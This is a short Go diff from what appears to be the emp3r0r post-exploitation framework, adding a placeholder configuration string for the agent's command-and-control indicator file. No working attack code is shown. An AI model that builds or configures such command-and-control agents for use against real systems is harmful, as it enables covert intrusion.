@@ -55,6 +55,9 @@ var (
 	// AgentRoot root directory of emp3r0r
 	AgentRoot = "[agent_root]"
 
+	// CCIndicatorText content of the cc indicator file
+	CCIndicatorText = "[agent_cc_text]"
+
 	// UtilsPath binary path of utilities
 	UtilsPath = AgentRoot + "/bin"
 
